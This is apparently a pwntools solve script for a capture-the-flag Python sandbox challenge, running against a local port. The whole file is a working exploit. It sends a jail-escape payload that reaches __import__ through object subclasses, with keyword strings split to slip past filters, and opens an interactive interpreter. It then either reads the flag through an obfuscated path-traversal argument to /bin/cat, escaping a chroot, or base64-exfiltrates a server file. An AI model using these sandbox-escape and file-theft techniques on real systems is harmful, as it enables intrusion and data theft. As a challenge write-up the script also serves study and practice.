from pwn import *
from base64 import b64decode
from ctypes import CDLL

def enc(msg:bytes):
    libc = CDLL("/lib/x86_64-linux-gnu/libc.so.6")
    payload = list(msg)
    for i in range(1, len(msg)):
        if libc.rand() % i == 1:
            payload[i] -= (libc.rand() % 10)
    return bytes(payload)

def get_flag(msg:bytes):
    p.sendlineafter(b'? ',payload)
    shell = b'''import os; os.spawnl(0,"/bin/cat", "cat", ''' + msg + b');'
    print(shell)
    p.sendlineafter(b'>> ', shell)

def get_file(server:bytes,  local:string):
    p.sendlineafter(b'? ', payload)
    file = f'''from base64 import b64encode; print(b64encode(open({server}, 'rb').read()));'''.encode()
    p.sendlineafter(b'>> ', file)

    with open(local, 'wb') as f:
        f.write(b64decode(eval(p.recvline(0).decode())))

if __name__ == '__main__':
    # p = process(["python3", "chall.py"])
    p = remote('localhost', 19010)
    context.log_level = 'warning'

    payload = b'''[(e.__init__.__globals__)for(e)in(''.__class__.__base__.__subclasses__())if("'_sitebui""ltins.")in(f"{e}")and("tter")in(f"{e}")]['e'=='s']['__buil''tins__']['__imp''ort__']('co''de').interact()'''
    if args.FLAG:
        get_flag('"{}"'.format(str(enc(b"../../../../../../../../../../../../../../../../../flag"),'utf8')).encode()) # getting shell and escape cat chroot sandbox
    else:
        get_file(b'/bin/cat', 'cat') # download cat to analyze locally

    p.interactive()